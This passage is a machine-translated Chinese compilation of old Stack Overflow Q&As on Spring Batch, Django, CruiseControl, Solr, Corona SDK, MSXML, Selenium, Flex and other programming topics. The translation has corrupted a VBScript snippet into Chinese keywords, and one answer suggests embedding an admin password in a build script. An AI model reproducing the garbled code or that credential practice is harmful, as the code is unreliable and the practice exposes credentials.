Spring Batch 似乎面向以数据为中心的工作。我需要从 S3 存储桶中提取数百万个文件，解压缩它们，根据内容执行一些逻辑，然后调用 Web 服务。

手动实现这一点是微不足道的，但在跟踪作业执行以及作业失败前的进展情况时，我不太喜欢重新发明轮子。Spring Batch 似乎非常适合这种工作监控，但我不确定颠覆它来进行文件处理是否太过分了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-19T17:13:05.750

简短的回答是是的，您可以为此使用弹簧批处理。我做了一个小型 POC，我们必须以批处理的方式将数百万张图像从源系统迁移到目标系统，恕我直言，它运行良好。

补充@Prasanna Talakanti 的评论，我建议结合使用 Spring Integration 和 Spring Batch。虽然 Spring Batch 将为您提供批处理的基础设施（间隔提交，如果失败则重新启动作业等），Spring 集成将为您提供有关 Web 服务网关的东西。

在 Spring 批处理中，您可以定义用于从 S3 读取数据的读取器和用于写入目标的写入器，如果需要，可以在两者之间使用处理器。您还可以微调提交间隔，因此如果作业在两者之间失败，您就有一个回滚点。

# c# - ASP.net、VS 2010、C#——如何在不同的页面上找到控件？

> ID：10603561
> 
> 赞同：0
> 
> 时间：2012-05-15T15:03:05.330
> 
> 标签：c#, asp.net, formview, findcontrol

我在 Default.aspx 页面上有一个 FormView。我在 App_Code 文件夹中有 BLL_Census.cs 类。我想在 BLL_Census.cs 的默认页面上的 FormView 上设置文本框的属性，但不知道如何在 BLL_Census.cs 中参考在其他页面上查找 FormView。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:15:36.397

一个页面只有在浏览器调用它时才“存在”所以不可能从当前页面访问另一个页面。如果需要共享页面区域，请使用 Page Controls 如果需要共享数据，请使用 Asp.NET Session

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:09:35.223

如果将 BLL_census.cs 中的值放入会话变量中并在浏览器中呈现其他页面时访问它会更容易

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T15:19:28.860

你在使用网站项目吗？尝试 Web 应用程序项目

# python - 在保存时修改 Django ModelForm 中文件的文件名

> ID：10603563
> 
> 赞同：1
> 
> 时间：2012-05-15T15:03:06.757
> 
> 标签：python, django, forms, file, modelform

我有一个带有 FileField 的 ModelForm 以及其他字段。我想在调用 myform.save() 时修改文件名以避免冲突（在文件名中插入 6 个随机字符）。在 Django 中执行此操作的正确方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T23:17:54.237

您需要覆盖模型的**`save`**方法，而不是表单的方法。

```
class MyModel(models.Model):
    # other fields
    my_file = models.FileField(upload_to='uploaddir')

    def save(self, *args, **kwargs):
        new_name = 'file_name-random-chars.ext'
        self.my_file.name = new_name
        super(MyModel, self).save(*args, **kwargs) 
```

您的 ModelForm`MyModel`将调用它的模型的保存方法并做到这一点。希望能帮助到你 ：）

# windows-server-2008 - 如何在 Windows Server 2008 中以管理员身份运行 CruiseControl 任务

> ID：10603566
> 
> 赞同：3
> 
> 时间：2012-05-15T15:03:15.243
> 
> 标签：windows-server-2008, cruisecontrol.net, keil

我目前正在使用[CruiseControl.NET](http://en.wikipedia.org/wiki/CruiseControl)来自动化我的构建。在我的构建环境中，我们有两种不同的方式来构建解决方案——一种是通过[Keil](http://en.wikipedia.org/wiki/Keil_%28company%29) uVision4 IDE，另一种是通过 Visual Studio 2008。

我已经成功获得了 Visual Studio 解决方案，可以使用 CruiseControl.NET 正确构建，并创建了一个批处理文件，该文件正确使用 Keil 的 uVision 命令行界面来编译我的 uvproj 项目（[此处为编译详细信息](http://www.keil.com/support/man/docs/uv4/uv4_commandline.htm)）。

## 问题描述

1）如果我使用管理员权限创建命令提示符，我可以在我的 Windows 2008 服务器上成功执行构建脚本并构建项目（我手动执行此操作 - 开始 -> 运行 -> 使用 ctrl-shift-enter 运行的 cmd作为管理员）。

*2) 但是，如果我在没有*管理员权限的情况下创建命令提示符并尝试执行批处理文件，则批处理文件将不起作用，除非我接受要求我确认运行批处理脚本需要管理员权限的提示。

如何以管理员身份通过 CruiseControl 自动执行批处理文件？

这是可以使用[RunAs](http://technet.microsoft.com/en-us/library/cc771525%28v=ws.10%29.aspx)命令自动化的吗？

* * *

## 技术细节

1) 正在执行的批处理文件非常简单 - 它删除旧的输出并重新生成输出，在下面的位置创建一个构建日志文件。

```
set BuildLogLocation=BuildLog\BuildLog.txt

echo on
cd ../..
cd PTM
rmdir /s /q output
mkdir output
mkdir BuildLog
C:\Keil\UV4\UV4.exe -r myProj.uvproj -o %BuildLogLocation%

echo ErrorLevel of build is %ERRORLEVEL%
echo build complete, see %BuildLogLocation% 
```

2）目前我正在寻找使用 Exec 功能来运行上面的 Keil 构建脚本：

```
<Exec>
    <Command>C:\myProject\Build\KeilBuild\BuildScript.bat<Command/>
    <buildTimeoutSeconds>600<buildTimeoutSeconds/>
    <!-- Details about error codes can be found here:
    http://www.keil.com/support/man/docs/uv4/uv4_commandline.htm -->
    <successExitCodes>0,1</successExitCodes>
<Exec/> 
```

相关问题：

*   *[如何使用带有 Keil uVision4 (MDK-ARM) 的构建服务器、编写构建脚本、使用 makefile？](https://electronics.stackexchange.com/questions/12404)*（[电气工程](https://electronics.stackexchange.com/about)）
*   *[从 CruiseControl.NET 执行命令行命令](https://stackoverflow.com/questions/5233389)*（[堆栈溢出](https://stackoverflow.com/about)）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-07T21:39:29.627

您能否以具有管理权限的用户身份运行 CCService、CruiseControl.NET Windows 服务？我会先试试。

如果这不起作用，我会使用 runas 来运行您的脚本。您必须将管理用户的密码嵌入到调用 runas 的脚本中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-11-03T15:07:21.560

我知道这很旧，但是，您是否通过巡航控制获得了官方的方法？

通常我创建它并调用它来调用其他进程“作为管理员”。

在内容中制作一个“.VBS”脚本：

> 暗淡 strBatchPath
> 
> strBatchPath = " `PATH-TO-FILE.EXE`"
> 
> 设置 runBatch = CreateObject("shell.application")
> 
> runBatch.shell 执行 strBatchPath,,,"runas",1

对于找不到官方方式的人来说，这可能是一个选择

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-07T15:46:21.987

您可以从 sysinternals 尝试 psExec。如果您不需要以 nt-authority 帐户运行，您应该能够以与 runas 相同的方式使用它。它允许您将用户名/密码作为开关传递（如果有记忆的话）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-11-04T16:27:03.233

我发现当使用 PSEXEC 并使用`-h`交换机时，它会在目的地“以管理员身份运行”

例如

> psexec -h \ServerToRunOn /accepteula -u DOMAIN\USER -p PASSWORD "PATH-TO-FILE"

我正在使用 CC.Net 调用带有上述内容的批处理文件。这将以管理员身份运行该文件

# solr - SOLR：带总和的范围查询

> ID：10603568
> 
> 赞同：0
> 
> 时间：2012-05-15T15:03:22.720
> 
> 标签：solr

我有一个示例架构，例如：

```
id:1,date:2012-05-01,parent:p1
id:1,date:2012-05-01,parent:p2
id:1,date:2012-05-01,parent:p3
id:1,date:2012-05-02,parent:p1
id:1,date:2012-05-02,parent:p4 
```

我想对“日期”进行范围查询，并知道每天有多少新/独特的父母发生。换句话说，我想看看随着时间的推移增加了多少新父母。对于给定的数据，输出应如下所示：

```
2012-04-31:0 (no parents existed an that time)
2012-05-01:3 (because three new parents occured at 2012-05-01: p1,p2,p3) 
2012-05-02:4 (which is 3 parents from 2012-05-01 and 1 new unique parent p4 occured at 2012-05-02 which gives a total of 4)
2012-05-03:4 (no new parent was added this day...) 
```

这种查询甚至可以在 SOLR 中进行吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:50:50.527

是的，如果我正确理解您的问题，这应该相当简单。添加类似的东西

```
fq=date:[2012-05-05T00:00:00Z TO 2012-05-06T00:00:00Z] 
```

到您的查询将获取日期在 5 月 5 日至 5 月 6 日之间的所有文档。确保以 ISO 8601 格式存储您的日期。

有关更多信息，请在此处查看日期示例：[http ://wiki.apache.org/solr/SolrQuerySyntax](http://wiki.apache.org/solr/SolrQuerySyntax)

**编辑**：我现在更好地理解了您的问题-您正在寻找“组崩溃”。

尝试

```
&group=true&group.field=parent&group.limit=1 
```

并计算返回的文档数量。

如果您希望它们具有每个日期的值，则需要按日期分面：

```
&facet=true&facet.field=date 
```

# sql - 非技术人员的人性化 PostgreSQL 界面？

> ID：10603576
> 
> 赞同：3
> 
> 时间：2012-05-15T15:03:37.867
> 
> 标签：sql, database, excel, postgresql

我目前在网站上使用的一堆 Excel 表中有很多半静态结构化数据。数据很少更改，所以我基本上在需要时使用 Apache POI 将数据（主要是复制文本、翻译等）直接从 excel 加载到内存中。它工作得很好。

但是，最终我想换成一个合适的数据库，最好是我用于真正动态的东西的同一个 PostgreSQL 数据库。然而，Excel 的优势在于所有与我一起工作的非技术人员都可以直接对其进行编辑，并将更改显示在网站上。我个人使用 pgAdmin 将数据库作为一个系统来管理，但它离机器太近了，我无法信任非技术人员。

是否有非技术人员可以理解的 PostgreSQL 通用 CRUD 管理界面？类似于 Django 的管理界面，以易于使用的方式公开最少的 CRUD 操作，不公开任何危险的旋钮或按钮，但不依赖于任何特定的 Web 框架？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-19T12:59:09.047

You should probably look at [pgAdmin](http://www.pgadmin.org/features.php). While it includes a lot of advanced capabilities geared toward software developers and DBAs, it has the [Edit Grid](http://www.pgadmin.org/docs/1.4/editgrid.html) tool, which sounds pretty much exactly like what you're asking for.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:09:20.483

您需要多快将数据输入数据库？

我一直有这个问题。通常，我通过以下方式之一解决它：

(1) 让用户更改 Excel 电子表格，然后让它们在晚上自动加载。数据将在第二天提供。

(2) 在 Excel 中嵌入一些东西，让用户可以将数据直接加载到数据库中。数据会自动加载。这也可以通过具有自动关闭宏 ni VBA 来完成。

(3) 很少会构建一个将数据加载到电子表格中的应用程序，然后让用户修改数据并将其写回。

没有足够的信息来找出最佳方法。但是，将用户保留在 Excel 中是一个好主意，因为他们最喜欢那种环境。

# php - 在php中获取最近的日期

> ID：10603582
> 
> 赞同：0
> 
> 时间：2012-05-15T15:03:59.750
> 
> 标签：php, mysql, sql

嗨，我正在尝试获取最近的日期，这是我的代码

```
 SELECT schedule_date  FROM  schedule_table WHERE schedule_date > '2012-06-07' and   event_id='23' ORDER BY schedule_date ASC
       LIMIT 1 
```

这里实际的表 schedule_date 包含 2012-06-07 00:00:00 这样的。但我检查 '2012-06-07' 所以

我得到这样的输出，这`2012-06-07 06:53:57`意味着相同的日期来了，但我需要`2012-06-08 04:53:57` 我认为在这里我们需要使用 like 运算符检查这个条件

我如何在此查询中使用 like 运算符来获取 sql 中最接近的日期。感谢提前。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:06:04.177

查询：按日期排序，大于/等于2012-06-07，限1

返回的记录应该是您想要的行

注意：不要使用 LIKE 运算符。这里没有必要，因为它用于在给定字符串中搜索文本匹配项。这显然不是您的查询想要完成的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T15:24:58.473

您有一个将日期值与日期时间字段类型匹配的经典案例。您需要的是同一日期内最早的时间值。可能您的数据包含多行数据，数据在同一日期但时间值不同。您应该使用以下内容：

```
SELECT schedule_date  FROM  schedule_table WHERE date(schedule_date) >= '2012-06-07' and   event_id='23' ORDER BY schedule_date ASC
       LIMIT 1 
```

date() 函数在[此处](http://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_date)的 MySQL 文档中进行了解释。

# coronasdk - Corona SDK中的滚动视图触摸事件？

> ID：10603583
> 
> 赞同：3
> 
> 时间：2012-05-15T15:04:00.723
> 
> 标签：coronasdk

我有一个孩子的滚动视图小部件（myrect）

我想检测“myrect”的触摸结束事件，但目前它只检测“开始”阶段！

这是完整的代码

```
 --main.lua
 local widget = require "widget"

 local myscrollview = widget.newScrollView{}

 local myrect = display.newRect(0, 0, display.contentWidth, 68)                  
 myrect:setFillColor(255,100,100,255)
 myscrollview:insert(myrect)

 local function ontouch(event)

    if event.phase == "ended" then
            print("event ended")
    end
end
myrect:addEventListener( "touch", ontouch ) 
```

我需要的是一个基本功能，奇怪的是电晕不支持它，或者我错过了一些东西

非常感谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T15:33:54.353

谢谢你 SatheeshJM 你的代码给了我错误的结果，所以当我点击矩形外的任何地方时，“触摸结束事件”将被触发

但最后我有解决方案以防万一有人感兴趣

这是解决方案的增强版

感谢丹尼[http://developer.anscamobile.com/forum/2012/05/15/scrollview-problem](http://developer.anscamobile.com/forum/2012/05/15/scrollview-problem)

和 Jonathan Beebe 提供了这个有用的解决方法[https://gist.github.com/1590908](https://gist.github.com/1590908)

```
local widget = require "widget"

local myscrollview = widget.newScrollView{}

local myrect = display.newRect(0, 0, display.contentWidth, 68)                  
myrect:setFillColor(255,100,100,255)
myscrollview:insert(myrect)

local function ontouch(event)

    if event.phase == "moved" then
        local dx = math.abs( event.x - event.xStart )
        local dy = math.abs( event.y - event.yStart )

        if dx > 5 or dy > 5 then
            myscrollview:takeFocus( event )
        end
    elseif event.phase == "ended" then
    display.getCurrentStage():setFocus(nil)
            print("event ended")
    end

    return true
end
myrect:addEventListener( "touch", ontouch ) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T23:50:36.390

当您触摸矩形时，会触发一个带有“开始”阶段的触摸事件。

由于滚动视图已插入到滚动视图中，因此触摸事件被传播到滚动视图。所以现在，您的滚动视图接收“开始”事件和相应的“移动”和“结束”阶段。矩形不再接收触摸事件。

如果你真的想检测“结束”阶段，你可以这样做

```
 local function ontouch(event)
        if event.phase == "began" then 
            return true
        elseif event.phase == "ended" then
            print("event ended")
        end
  end 
```

但是有一个问题！如果您通过按下矩形滚动它，滚动视图将不起作用。您必须通过按下滚动视图中的空白区域来滚动。

希望这是有道理的！

编辑：

好吧，其实是有办法的！您将事件焦点从滚动视图侦听器传递回矩形对象。

```
 --main.lua
 local widget = require "widget"
 local myrect

 local function scrollviewListener(event)
    display.getCurrentStage():setFocus(myrect)
 end 
 local myscrollview = widget.newScrollView{listener = scrollviewListener}

 myrect = display.newRect(0, 0, display.contentWidth, 68)                  
 myrect:setFillColor(255,100,100,255)
 myscrollview:insert(myrect)

 local function ontouch(event)

    if event.phase == "ended" then
            print("event ended")
    end
end
myrect:addEventListener( "touch", ontouch ) 
```

# php - 将变量放在PHP中的公共变量中

> ID：10603587
> 
> 赞同：1
> 
> 时间：2012-05-15T15:04:05.560
> 
> 标签：php, oop

我是 OOP 的新手，并试图定义一组可以在类的方法中访问的公共准备好的 SQL 查询。到目前为止，我发现，类的其他公共变量不能插入到另一个公共变量中。我完全愿意以任何其他方式做到这一点。下面是我要使用的代码：

```
class baseQuery
{
    public static $ignoreAccounts = "(1, 2, 3, 4)";
    public $preparedQuery = "SELECT COUNT(?) FROM ? WHERE removed != 1 AND accountid NOT IN static::$ignoreaccounts AND ? BETWEEN $dateAfter AND $dateBefore"; 
```

但我收到 Parse 错误：语法错误，意外的 '"'

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:08:20.393

我会进一步抽象它。创建获取您尝试获取的数据的公共方法，而不是包含一般 sql 语句的公共方法。

所以也许是一种`retrieveAccounts`方法。这需要忽略一系列帐户。

在该方法中，您可以添加忽略的帐户。

抱歉，澄清一下，您当前的设置不一定提供 OOP 的所有优点（我下面的示例也没有，但希望它可以帮助您找到方向）

也许您的应用程序可以受益于`AccountManager`

```
class AccountManager {
  public $retrieveAccounts($startDate, $endDate, $ignoredAccounts = array()) {
    return "SELECT COUNT(?) FROM ? WHERE removed != 1 AND accountid NOT IN $ignoreaccounts AND ? BETWEEN $dateAfter AND $dateBefore";

  }

$am = new AccountManager();
$accounts = $am->retrieveAccounts($startDate, $endDate); 
```

也许您的 AccountManager 类也应该有一个`addAcount`方法？我不知道。我相信最好的做法是考虑到你的课程有一个“消费者”，即使那个人是你。消费者不需要知道您是如何获取帐户信息的。他们只需要能够做到。就像我说的那样，这也不一定是这样做的方法，而是更强大的抽象。

因此，根据我上面的建议，如果由于某种原因您想从文件、postgres 或 mongodb 中提取帐号，该怎么办。您可以使用此类构建一个程序，如果您需要更改从哪里获取帐户，请在 AccountManager 中进行，并且您的程序根本不需要更改。

# xml - 正确使用 MSXML replaceChild

> ID：10603591
> 
> 赞同：0
> 
> 时间：2012-05-15T15:04:12.637
> 
> 标签：xml, msxml

我正在尝试用另一个 XML 文档中的节点替换一个 XML 文档中的节点。我收到以下错误：

```
Insert position node must be a Child of the node to insert under. 
```

这是我的 XML 的简化版本：XMLDOC1

```
<pages>
  <page id="1">
     <content>First Document</content>
  </page>
</pages> 
```

另一个 XML 文档的结构完全相同：XMLDOC2

```
<pages>
  <page id="1">
     <content>Second Document</content>
  </page>
</pages> 
```

我需要将第一个文档的页面节点替换为第二个文档的页面节点。我的尝试如下所示：

```
firstNode = xmlDoc1.selectSingleNode("//page[@id=1]")
secondNode = xmlDoc2.selectSingleNode("//page[@id=1]")
xmlDoc1.replaceChild(firstNode, oldNode) 
```

谢谢。

**解决方案**

```
firstNode.parentNode.replaceChild(xmlDoc1.importNode(secondNode, true), firstNode) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:13:49.297

的语法`replaceChild`是：

```
var objXMLDOMNode = oXMLDOMNode.replaceChild(newChild, oldChild); 
```

*   `newChild`- 一个东西。替换旧孩子的新孩子的地址。如果为 Null，则删除 oldChild 而不进行替换。
*   `oldChild`- 一个东西。将被新孩子替换的旧孩子的地址。

看来您必须**颠倒您的论点**。您运行的节点`replaceChild()`应该是您要替换的节点的**父节点。**你不应该在`document`. 最后，由于您要替换来自不同文档的节点，因此您应该**首先**使用`xmlDoc1.importNode(secondNode, true)`. 您还可以在新上下文中`cloning`使用之前考虑使用该节点`cloneNode(deep)`（这样您就可以拥有自己的副本）。

ps 不应该是`secondNode`而不是`oldNode`在您的代码片段中吗？

# sencha-touch - 如何获取 FieldSet 的元素

> ID：10603594
> 
> 赞同：3
> 
> 时间：2012-05-15T15:04:20.877
> 
> 标签：sencha-touch, extjs, sencha-touch-2

我有一个 FieldSet ：

```
Ext.define('admin.view.BuzzEditForm', {
    extend: 'Ext.form.Panel',
    requires: ['Ext.form.FieldSet','Ext.Img'],
    id: 'editorPanel',
    xtype: 'buzzEditForm',
    config: {
        /* modal: true,
         hideOnMaskTap: false,
         centered: true,
         width: 500,
         scrollable: false,*/
        items: [{
            xtype: 'fieldset',
            items: [
                {
                    xtype: 'textfield',
                    name: 'keyword',
                    label: 'Mots clés'
                },
                {
                    xtype: 'textfield',
                    name: 'title',
                    label: 'Titre'
                },
                {
                    id: 'editorPanelvisual',
                    xtype: 'field',
                    label: 'Visuel actuel',
                    component:
                    {
                        xtype: 'container',
                        layout: 'hbox',
                        items: [
                            {
                                id: 'buzzImageField',
                                flex: 1,
                                xtype: 'image',
                                src: 'http://pierre.chachatelier.fr/programmation/images/mozodojo-original-image.jpg',
                                height: 200
                            },
                            {
                                id: 'buzzChooseImageField',
                                xtype: 'button',
                                iconCls: 'arrow_right',
                                iconMask: true,
                                ui: 'action',
                                action: 'chooseBuzzImage'
                            }

                        ]
                    }

                },
                {
                    xtype: 'textfield',
                    name: 'visual',
                    label: 'Visuel'
                }
            ]
        }]
    }
}); 
```

我可以使用 Ext.getCmp('#editorPanel') 获取我的 formPanel，但是如何使用其名称获取字段？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T15:07:05.880

只需使用`Ext.ComponentQuery`，例如：

`Ext.ComponentQuery.query('textfield[name="keyword"]')`

有关详细信息，请参阅：[http ://docs.sencha.com/touch/2-0/#!/api/Ext.ComponentQuery](http://docs.sencha.com/touch/2-0/#!/api/Ext.ComponentQuery)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T14:38:51.900

只是提到`Ext.ComponentQuery.query('textfield[name="keyword"]')`返回一个数组。因此，如果您只需要一个元素，如上面的示例，则必须使用 .pop() 函数来获取最后一个也是唯一的元素，然后对其进行操作。

# java - Java调用方法返回值作为switch case值

> ID：10603595
> 
> 赞同：4
> 
> 时间：2012-05-15T15:04:21.737
> 
> 标签：java, switch-statement, case, method-call

我必须使用一个值，通常通过 switch case 中的方法返回。

```
int getVal(){return 121;}

 switch(expr){

    case getVal():
 } 
```

但它给出的编译错误：需要常量表达式。

我也试过了，

```
int _val = getVal();

 switch(expr){

    case _val:
 } 
```

有同样的结果。

是否有任何解决方法来实现它。

谢谢，阿米特

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T15:06:05.803

正如错误明确指出的那样，`switch`仅适用于**常量**表达式。

您需要使用`if`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:12:40.107

这是行不通的，因为虽然您*认为*您的方法实际上是一个常量，但它可能是隐藏的，该类可能是子类，或者任何数量的其他项目可能会干扰。

虽然编译器可以尝试识别返回值是一个常量，但它不会，因为它*也*没有完整的画面，因为 Java 项目中的类可以在不同的时间编译（子类*在*它们的父类之后编译等） )

此外，还没有明确确定作为开关标签的功能是什么意思。虽然您可能将其视为重命名常量的简写，但其他人可能希望在每次输入开关时对其进行评估，而其他人可能希望在每次输入标签时对其进行评估，而另一个人可能希望它每次切换到该标签时都要进行评估（这是不可能的，因为您必须在跳转到它*之前*评估这样的标签。）由于没有明确的共识，最好将其排除在语言之外，直到有明确的共识。

这甚至不能保证这种方法不会返回重复的标签（开关不支持具有相同值的多个标签）。

# python - 是否有在 python3 中工作的“期望”或类似期望的库的实现？

> ID：10603596
> 
> 赞同：10
> 
> 时间：2012-05-15T15:04:22.547
> 
> 标签：python, python-3.x, expect, fabric, pexpect

我想在 python3 中使用类似期望的模块。据我所知，pexpect 和 fabric 都不适用于 python3。我可以使用任何类似的软件包吗？（如果没有，有谁知道 py3 支持是否在任何项目的路线图上？）

完全重叠的功能集不是必需的。我认为我的用例在这里没有必要，但我基本上是在重新实现一个 Linux 预期脚本，该脚本使用一些配置提供的命令执行 telnet，但扩展了功能。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-17T12:25:33.930

正如 Niek 提到的，我移植了 pexpect，并将其命名为 pexpect-u（u 代表 unicode）：

> [http://pypi.python.org/pypi/pexpect-u/](http://pypi.python.org/pypi/pexpect-u/)

它使用 2to3，但在它工作之前我还必须对代码进行一些更改。

我对维护它不是很感兴趣，但是我联系不上pexpect的作者，我觉得它足够有用，值得出版。如果您有兴趣研究它，代码[在 Bitbucket 上](https://bitbucket.org/takluyver/pexpect)。我自己对它的需求是非常基本的，所以可能有我没有发现的错误。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-05-28T00:38:09.837

令人高兴的是，pexpect 现在支持 python 3（如果不是更早的话，截至 2013 年）。

看来@ThomasK 已经能够将他的 pexpect-u Python 3 功能（带有一些 API 更改）添加回主项目。（谢谢托马斯！）

# c# - windows服务可以在不登录的情况下启动应用程序吗？

> ID：10603601
> 
> 赞同：1
> 
> 时间：2012-05-15T15:04:28.893
> 
> 标签：c#, windows, service, windows-services

我的问题是一种可能性，然后是如何去做。我目前有两个自定义 Windows 服务，一个使用 TCP 通过网络将文件从客户端发送到主机，另一个接收这些文件，一旦传输完成启动一个 C# 应用程序，该应用程序开始将这些文件上传到数据库（两个服务做更多，但这是他们所做的基本想法）。我的问题是，是否可以让在主机（服务器）上运行的服务启动 C# 应用程序以在没有用户登录的情况下上传？或者我是否也必须将该应用程序转变为服务？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T15:06:43.667

> 是否可以让在主机（服务器）上运行的服务启动 C# 应用程序以在没有用户登录的情况下上传？

这就是 Windows 服务的全部意义——它们无需任何人登录即可运行。

是的，他们可以启动其他进程——这通常是通过[`Process`](http://msdn.microsoft.com/en-us/library/system.diagnostics.process.aspx)类来完成的。

```
Process.Start("path to application", "command line arguments"); 
```

您可以使用返回的`Process`引用并在以后终止它（如果它不是自终止的），以确保您的服务器不会执行它的多个副本并且内存不足。

# c# - Webdriver“sendkeys”方法没有正确输入密码

> ID：10603608
> 
> 赞同：4
> 
> 时间：2012-05-15T15:04:41.800
> 
> 标签：c#, visual-studio, selenium, webdriver, sendkeys

我在 Visual Studio C# 语言上使用 Selenium Webdriver。Nunit 是测试驱动程序。

我正在尝试使用我的用户名和密码登录我的公司网站。

```
query.SendKeys("myusername");
query.SendKeys(Keys.Tab);
query.SendKeys("mypassword"); 
```

我的代码找到用户名文本框，输入“myusername”（示例），正确选择密码框，但随后应该在 pw 文本框中输入“mypassword”，它位于用户名文本框并添加（显示“我的用户名我的密码")

它不让我输入密码的原因是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T15:20:01.730

SendKeys 方法会将字符发送到您调用它的任何 WebElement 对象，在本例中为查询。即使在切换到下一个对象之后，它仍然会向查询元素发送键。以我的经验，使用键（例如制表符）在元素之间跳转往往是不一致且不可靠的。相反，尝试这样的事情：

```
WebElement userNameField = driver.findElement(By.id("userNameTextBoxId"));
WebElement passwordField = driver.findElement(By.id("passwordTextBoxId"));
userNameField.sendKeys("myusername");
passwordField.sendKeys("mypassword"); 
```

如果您在文本框中没有 id，则可以使用其他几个标识符，例如 classname 和 xpath（尽管我在 selenium 中使用 xpath 的经验很糟糕——尽可能使用 id）。

# php - PHP 上的 HTML 标签元素包含在 IE 上

> ID：10603609
> 
> 赞同：0
> 
> 时间：2012-05-15T15:04:44.560
> 
> 标签：php, internet-explorer, input, include, label

我有一个关于我的一个项目中发生在我身上的奇怪事情的问题。当使用这样的 html 创建一个简单的 php 文件时：

```
<input type="checkbox" id="sample" />
<label for="sample">Click</label> 
```

然后单击标签将选中复选框，但是当我在外部文件中创建相同的代码并使用 php 包含函数时，标签不适用于 IE 上的复选框！

例如：

```
<html>
<head>
...
</head>
<body>
...
<?php include "myInclude.php"; ?>
...
</body>
</html> 
```

当 myInclude.php 是：

```
<input type="checkbox" id="sample" />
<label for="sample">Click</label> 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:06:53.887

输出标记可能有问题，请在视图源中验证它是否与您的非包含样本匹配。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:10:03.840

除了 Matt Lo 的回答：也许还有另一个 ID 为“sample”的元素？还要使用 W3C 验证器检查您的标记。

# apache-flex - Flex3 - 将 flashvars 传递给 html 包装器中的 swf

> ID：10603611
> 
> 赞同：0
> 
> 时间：2012-05-15T15:04:46.173
> 
> 标签：apache-flex, null, flash, flashvars

我在将 flashvars 传递到我的应用程序的 swf 时遇到问题。

我正在使用 flex builder 提供的默认模板，我在其中添加了 flashvar，如 adobe livedocs 中所述：

```
AC_FL_RunContent(
        "src", "playerProductInstall",
        "FlashVars", "MMredirectURL="+MMredirectURL+'&MMplayerType='+MMPlayerType+'&MMdoctitle='+MMdoctitle+'langStyle=Styles_jp.swf&langId=jp_JP&langSource=jp_JP.xml'+"",
        "width", "100%", ...

AC_FL_RunContent(
        "src", "SOD",
        "FlashVars", "langStyle=Styles_jp.swf&langId=jp_JP&langSource=jp_JP.xml",
        "width", "100%", ...

<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
            id="SOD" width="100%" height="100%"
            codebase="http://fpdownload.macromedia.com/get/flashplayer/current/swflash.cab">
            <param name="movie" value="SOD.swf" />
            <param name="quality" value="high" />
            <param name="bgcolor" value="#869ca7" />
            <param name="allowScriptAccess" value="sameDomain" />
            <embed src="SOD.swf" quality="high" bgcolor="#869ca7"
                FlashVars="langStyle=Styles_jp.swf&langId=jp_JP&langSource=jp_JP.xml" 
```

我需要在应用程序的预初始化状态读取 Application.application.parameters 值。似乎在这个阶段，顶级应用程序已经知道 flashvars。

使用 firebug，我在 AC_OETags.js 中放置了断点，以查看 AC_Generateobj 是否获得了正确的参数，并且它确实获得了正确的参数。输出 str 等于：

```
<embed src="SOD.swf" width="100%" height="100%" align="middle" id="SOD" quality="high" bgcolor="#869ca7" name="SOD" allowScriptAccess="sameDomain" pluginspage="http://www.adobe.com/go/getflashplayer" FlashVars="langStyle=Styles_jp.swf&langId=jp_JP&langSource=jp_JP.xml" type="application/x-shockwave-flash" > </embed> 
```

尽管该应用程序确实具有 flashvars；当我尝试在预初始化阶段获取它们时，我收到一条错误消息，指出 Application.application.parameters 为空。

有没有人知道我做错了什么......？

提前致谢 ：）

* * *

@mgraph

这是我现在拥有的包装器：

```
<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title></title>
        <script src="AC_OETags.js" language="javascript"></script>
        <style>
            body { margin: 0px; overflow:hidden }
        </style>
    </head>

    <body scroll="no">
        <noscript>
            <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
                id="SOD" width="100%" height="100%"
                codebase="http://fpdownload.macromedia.com/get/flashplayer/current/swflash.cab">
                <param name="movie" value="SOD.swf" />
                <param name="quality" value="high" />
                <param name="bgcolor" value="#869ca7" />
                <param name="allowScriptAccess" value="sameDomain" />
                <embed src="SOD.swf" quality="high" bgcolor="#869ca7"
                    width="100%" height="100%" name="SOD" align="middle"
                    play="true"
                    loop="false"
                    quality="high"
                    allowScriptAccess="sameDomain"
                    type="application/x-shockwave-flash"
                    pluginspage="http://www.adobe.com/go/getflashplayer">
                </embed>
            </object>
        </noscript>
    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:09:26.863

你应该做：

```
....
<param name="FlashVars" value="langStyle=Styles_jp.swf&langId=jp_JP&langSource=jp_JP.xml" />
<embed src="SOD.swf" quality="high" bgcolor="#869ca7"
